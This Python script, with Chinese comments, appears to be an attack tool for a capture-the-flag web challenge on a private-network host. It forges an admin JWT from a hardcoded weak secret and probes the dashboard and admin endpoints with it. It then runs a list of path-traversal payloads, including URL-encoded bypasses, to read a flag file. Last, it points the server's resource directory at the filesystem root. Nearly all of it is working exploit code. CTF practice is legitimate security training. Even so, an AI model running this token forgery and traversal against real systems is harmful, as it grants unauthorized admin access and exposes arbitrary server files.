#!/usr/bin/env python3
"""
测试所有已知端点
"""

import jwt
import requests

TARGET = "http://192.168.18.25:25004"
JWT_SECRET = "secret-secret-secret-secret-secret-secret-secret-secret-secret-secret-secret"

# 创建 admin token
payload = {"sub": "admin", "role": "admin"}
admin_token = jwt.encode(payload, JWT_SECRET, algorithm="HS512")
print(f"[+] Admin Token 已生成\n")

headers = {"Cookie": f"token={admin_token}"}

print("[*] 测试 Dashboard 端点 (需要登录):")
dashboard_endpoints = [
    ("/dashboard/list", "GET"),
    ("/dashboard/download", "GET"),
    ("/dashboard/stats", "GET"),
    ("/dashboard/recent", "GET"),
]

for endpoint, method in dashboard_endpoints:
    try:
        r = requests.get(TARGET + endpoint, headers=headers, timeout=5)
        print(f"  {endpoint:30} -> {r.status_code}")
        if r.status_code == 200 and len(r.text) < 500:
            print(f"    {r.text[:200]}")
    except Exception as e:
        print(f"  {endpoint:30} -> Error")

print("\n[*] 测试 Admin 端点:")
admin_endpoints = [
    ("/admin/delete", "POST"),
    ("/admin/rename", "POST"),
    ("/admin/upload", "POST"),
    ("/admin/challengeResourceDir", "POST"),
]

for endpoint, method in admin_endpoints:
    try:
        r = requests.post(TARGET + endpoint, headers=headers, json={}, timeout=5)
        print(f"  {endpoint:30} -> {r.status_code}")
        if r.status_code == 200 and len(r.text) < 300:
            print(f"    {r.text[:200]}")
    except Exception as e:
        print(f"  {endpoint:30} -> Error")

print("\n[*] 测试文件读取漏洞 - /dashboard/download:")
test_paths = [
    "test.txt",
    "../flag",
    "../flag.txt",
    "../../flag",
    "../../flag.txt",
    "../../../flag",
    "../../../flag.txt",
    "uploads/../flag",
    "uploads/../../flag",
    "uploads%2f..%2fflag",  # URL编码绕过
    "uploads%2f..%2fflag.txt",
    "uploads%2f..%2f..%2fflag",
    "uploads%2f..%2f..%2fflag.txt",
]

for path in test_paths:
    try:
        r = requests.get(f"{TARGET}/dashboard/download?path={path}", headers=headers, timeout=5)
        if r.status_code == 200:
            print(f"  [{path}] -> 成功!")
            content = r.text[:300]
            print(f"    {content}")
            if "flag" in content.lower() or "pcb" in content.lower() or "{" in content:
                print(f"\n[!] 可能找到FLAG:\n{r.text}")
                break
        elif r.status_code != 404:
            print(f"  [{path}] -> {r.status_code}")
    except:
        pass

print("\n[*] 修改资源目录并列出文件:")
# 先修改资源目录
try:
    r = requests.post(
        f"{TARGET}/admin/challengeResourceDir",
        headers=headers,
        json={"resourceDir": "/"},
        timeout=5
    )
    print(f"  设置资源目录到 / -> {r.status_code}")
    print(f"    {r.text}")
except Exception as e:
    print(f"  Error: {e}")

# 然后列出文件
try:
    r = requests.get(f"{TARGET}/dashboard/list", headers=headers, timeout=5)
    print(f"\n  列出文件 -> {r.status_code}")
    if r.status_code == 200:
        print(f"    {r.text[:500]}")
except Exception as e:
    print(f"  Error: {e}")
